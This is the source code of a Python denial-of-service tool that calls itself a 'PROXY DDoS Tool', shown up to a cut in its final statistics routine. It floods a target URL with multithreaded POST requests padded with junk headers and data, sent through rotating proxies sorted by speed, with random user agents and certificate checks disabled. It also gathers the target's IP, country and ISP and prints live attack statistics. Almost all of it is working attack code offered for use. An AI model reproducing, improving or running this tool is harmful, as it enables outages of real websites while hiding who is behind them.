#!/usr/bin/env python3
"""
🚀 PROXY DDoS Tool - Enhanced Version
Author: Anonymous
Features: Multi-threading, Proxy Rotation, Geo-targeting, Performance Monitoring
"""

import argparse
import subprocess
import time
import requests
import sys
import random
import threading
import os
import re
import socket
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from colorama import Fore, Style, init
from dataclasses import dataclass
from typing import List, Dict, Tuple, Optional
import logging
import signal
import psutil

# Initialize colorama
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('ddos_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class AttackStats:
    """Statistics tracking for attack"""
    requests_sent: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    start_time: float = 0
    proxies_used: int = 0
    countries_used: List[str] = None
    
    def __post_init__(self):
        self.countries_used = []
        self.start_time = time.time()
    
    def get_requests_per_second(self) -> float:
        elapsed = time.time() - self.start_time
        return self.requests_sent / elapsed if elapsed > 0 else 0

class ProxyManager:
    """Manages proxy loading, validation and rotation"""
    
    def __init__(self, proxy_file: str = "proxy.txt"):
        self.proxy_file = proxy_file
        self.proxies = []
        self.proxy_index = 0
        self.lock = threading.Lock()
        self.proxy_cache = {}
        
    def load_proxies(self) -> List[str]:
        """Load and validate proxies from file"""
        try:
            if not os.path.exists(self.proxy_file):
                logger.error(f"Proxy file {self.proxy_file} not found!")
                return []
            
            with open(self.proxy_file, 'r') as f:
                raw_proxies = [line.strip() for line in f if line.strip()]
            
            # Validate proxy format
            valid_proxies = []
            proxy_pattern = re.compile(
                r'^(?:http[s]?://)?'  # Optional protocol
                r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # Domain
                r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|'  # IPv4
                r'\[?[A-F0-9]*:[A-F0-9:]+\]?)'  # IPv6
                r'(?::\d+)?'  # Optional port
                r'(?:/?|[/?]\S+)$', re.IGNORECASE
            )
            
            for proxy in raw_proxies:
                if proxy_pattern.match(proxy):
                    # Add http:// if no protocol specified
                    if not proxy.startswith(('http://', 'https://')):
                        proxy = f'http://{proxy}'
                    valid_proxies.append(proxy)
                else:
                    logger.warning(f"Invalid proxy format: {proxy}")
            
            self.proxies = valid_proxies
            logger.info(f"Loaded {len(self.proxies)} valid proxies")
            return self.proxies
            
        except Exception as e:
            logger.error(f"Error loading proxies: {e}")
            return []
    
    def get_next_proxy(self) -> Optional[str]:
        """Get next proxy in round-robin fashion"""
        with self.lock:
            if not self.proxies:
                return None
            
            proxy = self.proxies[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
            return proxy
    
    def check_proxy_latency(self, proxy: str, timeout: int = 5) -> float:
        """Check proxy response time"""
        try:
            start = time.time()
            response = requests.get(
                'http://httpbin.org/ip',
                proxies={'http': proxy, 'https': proxy},
                timeout=timeout
            )
            latency = (time.time() - start) * 1000  # Convert to ms
            if response.status_code == 200:
                return latency
        except:
            pass
        return float('inf')
    
    def sort_proxies_by_speed(self):
        """Sort proxies by response time (fastest first)"""
        logger.info("Testing proxy speeds...")
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.check_proxy_latency, proxy): proxy 
                      for proxy in self.proxies}
            
            proxy_speeds = []
            for future in as_completed(futures):
                proxy = futures[future]
                try:
                    latency = future.result(timeout=10)
                    if latency != float('inf'):
                        proxy_speeds.append((proxy, latency))
                except:
                    pass
            
            # Sort by latency (lowest first)
            proxy_speeds.sort(key=lambda x: x[1])
            self.proxies = [proxy for proxy, _ in proxy_speeds]
            logger.info(f"Sorted {len(self.proxies)} proxies by speed")

class TargetValidator:
    """Validates target and gathers information"""
    
    @staticmethod
    def validate_url(url: str) -> bool:
        """Validate URL format"""
        url_pattern = re.compile(
            r'^(?:http|ftp)s?://'  # Protocol
            r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+[A-Z]{2,6}\.?|'  # Domain
            r'localhost|'  # Localhost
            r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # IPv4
            r'(?::\d+)?'  # Optional port
            r'(?:/?|[/?]\S+)$', re.IGNORECASE
        )
        return bool(url_pattern.match(url))
    
    @staticmethod
    def get_target_info(url: str) -> Dict:
        """Get information about target"""
        info = {
            'url': url,
            'ip': None,
            'hostname': None,
            'country': None,
            'isp': None
        }
        
        try:
            # Extract hostname from URL
            hostname = url.split('://')[1].split('/')[0].split(':')[0]
            info['hostname'] = hostname
            
            # Get IP address
            try:
                ip = socket.gethostbyname(hostname)
                info['ip'] = ip
                
                # Get geo information
                response = requests.get(f'http://ip-api.com/json/{ip}')
                if response.status_code == 200:
                    geo_data = response.json()
                    info['country'] = geo_data.get('country', 'Unknown')
                    info['isp'] = geo_data.get('isp', 'Unknown')
            except:
                pass
                
        except Exception as e:
            logger.error(f"Error getting target info: {e}")
        
        return info

class AttackVisualizer:
    """Visualizes attack progress and statistics"""
    
    # ANSI color codes
    COLORS = [
        Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, 
        Fore.MAGENTA, Fore.CYAN, Fore.WHITE,
        Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTYELLOW_EX,
        Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTCYAN_EX
    ]
    
    @staticmethod
    def print_banner():
        """Print tool banner"""
        banner = f"""
{Fore.RED}╔════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                            ║
{Fore.RED}║  {Fore.CYAN}██╗  ██╗██████╗ ██████╗  ██████╗ ██╗  ██╗███████╗  {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║  ██║██╔════╝  {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}███████║██████╔╝██████╔╝██║   ██║███████║█████╗    {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}██╔══██║██╔═══╝ ██╔═══╝ ██║   ██║██╔══██║██╔══╝    {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}██║  ██║██║     ██║     ╚██████╔╝██║  ██║███████╗  {Fore.RED}║
{Fore.RED}║  {Fore.CYAN}╚═╝  ╚═╝╚═╝     ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝  {Fore.RED}║
{Fore.RED}║                                                            ║
{Fore.RED}║       {Fore.YELLOW}⚡ PROXY DDoS TOOL - ENHANCED EDITION ⚡       {Fore.RED}║
{Fore.RED}║       {Fore.LIGHTWHITE_EX}Multi-threaded • Proxy Rotation • Real-time Stats   {Fore.RED}║
{Fore.RED}╚════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)
    
    @staticmethod
    def print_attack_info(target_info: Dict, attack_params: Dict):
        """Print attack information"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}🎯 TARGET INFORMATION")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}URL:     {Fore.WHITE}{target_info['url']}")
        print(f"{Fore.GREEN}IP:      {Fore.WHITE}{target_info.get('ip', 'Unknown')}")
        print(f"{Fore.GREEN}Hostname:{Fore.WHITE}{target_info.get('hostname', 'Unknown')}")
        print(f"{Fore.GREEN}Country: {Fore.WHITE}{target_info.get('country', 'Unknown')}")
        print(f"{Fore.GREEN}ISP:     {Fore.WHITE}{target_info.get('isp', 'Unknown')}")
        
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}⚙️  ATTACK PARAMETERS")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}Duration:    {Fore.WHITE}{attack_params['time']} seconds")
        print(f"{Fore.GREEN}Threads:     {Fore.WHITE}{attack_params['threads']}")
        print(f"{Fore.GREEN}Request Rate:{Fore.WHITE}{attack_params['rate']}/s")
        print(f"{Fore.CYAN}{'='*60}\n")
    
    @staticmethod
    def print_stats(stats: AttackStats, proxies_count: int):
        """Print real-time statistics"""
        elapsed = time.time() - stats.start_time
        rps = stats.get_requests_per_second()
        
        sys.stdout.write(f"\r{Fore.YELLOW}[{datetime.now().strftime('%H:%M:%S')}] "
                        f"{Fore.CYAN}Requests: {Fore.WHITE}{stats.requests_sent:,} "
                        f"{Fore.GREEN}({rps:.1f}/s) "
                        f"{Fore.MAGENTA}Success: {Fore.WHITE}{stats.successful_requests:,} "
                        f"{Fore.RED}Failed: {Fore.WHITE}{stats.failed_requests:,} "
                        f"{Fore.BLUE}Proxies: {Fore.WHITE}{proxies_count} "
                        f"{Fore.LIGHTCYAN_EX}Time: {Fore.WHITE}{int(elapsed)}s")
        sys.stdout.flush()
    
    @staticmethod
    def print_status_line(proxy: str, country: str, target: str):
        """Print single attack status line"""
        color = random.choice(AttackVisualizer.COLORS)
        current_time = datetime.now().strftime("%H:%M:%S")
        
        # Extract proxy IP for display
        proxy_ip = proxy.split('://')[1].split(':')[0] if '://' in proxy else proxy.split(':')[0]
        
        print(f"{color}[{current_time}] {Fore.YELLOW}POST {Fore.WHITE}→ "
              f"{Fore.CYAN}{target}:443 {Fore.WHITE}| "
              f"{Fore.GREEN}Proxy: {proxy_ip} {Fore.WHITE}| "
              f"{Fore.MAGENTA}Country: {country} {Fore.WHITE}| "
              f"{Fore.LIGHTGREEN_EX}Status: Sending...")

class DDoSAttacker:
    """Main DDoS attack orchestrator"""
    
    def __init__(self, target: str, attack_time: int, rate: int, threads: int):
        self.target = target
        self.attack_time = attack_time
        self.request_rate = rate
        self.threads = threads
        self.stats = AttackStats()
        self.is_attacking = False
        self.proxy_manager = ProxyManager()
        self.target_validator = TargetValidator()
        self.visualizer = AttackVisualizer()
        
        # Signal handling for graceful shutdown
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle interrupt signals"""
        print(f"\n\n{Fore.YELLOW}[!] Received interrupt signal. Stopping attack...")
        self.is_attacking = False
        time.sleep(1)
        sys.exit(0)
    
    def validate_target(self) -> bool:
        """Validate target URL"""
        if not self.target_validator.validate_url(self.target):
            print(f"{Fore.RED}[✗] Invalid URL format: {self.target}")
            return False
        
        print(f"{Fore.GREEN}[✓] Valid URL format")
        return True
    
    def prepare_proxies(self) -> bool:
        """Load and prepare proxies"""
        print(f"{Fore.YELLOW}[*] Loading proxies...")
        proxies = self.proxy_manager.load_proxies()
        
        if not proxies:
            print(f"{Fore.RED}[✗] No valid proxies found!")
            return False
        
        print(f"{Fore.GREEN}[✓] Loaded {len(proxies)} proxies")
        
        # Optional: Sort proxies by speed
        print(f"{Fore.YELLOW}[*] Testing proxy speeds...")
        self.proxy_manager.sort_proxies_by_speed()
        
        return True
    
    def send_request(self, proxy: str, session: requests.Session) -> bool:
        """Send HTTP request using proxy"""
        try:
            # Prepare request headers
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'max-age=0',
                'Pragma': 'no-cache'
            }
            
            # Add more headers to increase request size
            for i in range(10):
                headers[f'X-Custom-Header-{i}'] = 'A' * 100
            
            # Send request
            start_time = time.time()
            response = session.post(
                self.target,
                headers=headers,
                data={'data': 'A' * 1024},  # 1KB of data
                proxies={'http': proxy, 'https': proxy},
                timeout=10,
                verify=False  # Warning: Disables SSL verification
            )
            
            request_time = (time.time() - start_time) * 1000
            
            # Update statistics
            self.stats.requests_sent += 1
            if response.status_code < 400:
                self.stats.successful_requests += 1
                return True
            else:
                self.stats.failed_requests += 1
                return False
                
        except requests.exceptions.RequestException as e:
            self.stats.failed_requests += 1
            return False
        except Exception as e:
            self.stats.failed_requests += 1
            return False
    
    def attack_worker(self, worker_id: int):
        """Worker thread for sending requests"""
        session = requests.Session()
        session.keep_alive = False  # Disable keep-alive
        
        requests_per_second = self.request_rate // self.threads
        interval = 1.0 / requests_per_second if requests_per_second > 0 else 0
        
        while self.is_attacking:
            try:
                proxy = self.proxy_manager.get_next_proxy()
                if not proxy:
                    time.sleep(0.1)
                    continue
                
                # Get proxy country for display
                proxy_ip = proxy.split('://')[1].split(':')[0] if '://' in proxy else proxy.split(':')[0]
                country = self.get_proxy_country(proxy_ip)
                
                # Send request
                success = self.send_request(proxy, session)
                
                # Display status (only from first worker to avoid clutter)
                if worker_id == 0:
                    self.visualizer.print_status_line(proxy, country, self.target)
                
                # Rate limiting
                if interval > 0:
                    time.sleep(interval)
                    
            except Exception as e:
                logger.error(f"Worker {worker_id} error: {e}")
                time.sleep(1)
    
    def get_proxy_country(self, proxy_ip: str) -> str:
        """Get country for proxy IP (with caching)"""
        cache_key = proxy_ip
        if cache_key in self.proxy_manager.proxy_cache:
            return self.proxy_manager.proxy_cache[cache_key]
        
        try:
            response = requests.get(f'http://ip-api.com/json/{proxy_ip}', timeout=2)
            if response.status_code == 200:
                data = response.json()
                country = data.get('country', 'Unknown')
                self.proxy_manager.proxy_cache[cache_key] = country
                return country
        except:
            pass
        
        return "Unknown"
    
    def start_attack(self):
        """Start the DDoS attack"""
        print(f"{Fore.GREEN}[✓] Starting attack...")
        
        # Validate parameters
        if not self.validate_target():
            return
        
        if not self.prepare_proxies():
            return
        
        # Get target information
        target_info = self.target_validator.get_target_info(self.target)
        
        # Print attack info
        self.visualizer.print_banner()
        attack_params = {
            'time': self.attack_time,
            'threads': self.threads,
            'rate': self.request_rate
        }
        self.visualizer.print_attack_info(target_info, attack_params)
        
        # Start attack
        self.is_attacking = True
        start_time = time.time()
        end_time = start_time + self.attack_time
        
        # Create worker threads
        threads = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_worker, args=(i,))
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # Monitor and display statistics
        try:
            while time.time() < end_time and self.is_attacking:
                self.visualizer.print_stats(self.stats, len(self.proxy_manager.proxies))
                time.sleep(0.5)
            
            # Stop attack
            self.is_attacking = False
            
            # Wait for threads to finish
            for thread in threads:
                thread.join(timeout=2)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack interrupted by user")
            self.is_attacking = False
        
        # Print final statistics
        self.print_final_stats()
    
    def print_final_stats(self):
        """Print final attack statistics"""
        elapsed = time.time() - self.stats.start_time
        rps = self.stats.get_requests_per_second()
        
        print(f"\n\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}📊 ATTACK COMPLETED - FINAL STATISTICS")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.GREEN}Target URL:          {Fore.WHITE}{self.target}")
        print(f"{Fore.GREEN}Attack Duration:     {Fore.WHITE}{int(elapsed)} seconds")
        print(f"{Fore.GREEN}Total Requests:      {Fore.WHITE}{self.stats.requests_sent:,}")
        print(f"{Fore.GREEN}Successful Requests: {Fore.WHITE}{self.stats.successful_requests:,}")
        print(f"{Fore.GREEN}Failed Requests:     {Fore.WHITE}{self.stats.failed_requests:,}")
        print(f"{Fore.GREEN}Requests Per Second: {Fore.WHITE}{rps:.1f}")
        print(f"{Fore.GREEN}Success Rate:        {Fore.WHITE}"
              f"{(self.stats.successful_requests/self.stats.requests_sent*100):.1f}%"
              if self.stats.requests_sent > 0 else "0%")
        print(f"{Fore.GREEN}Proxies Used:        {Fore.WHITE}{len(self.proxy_manager.
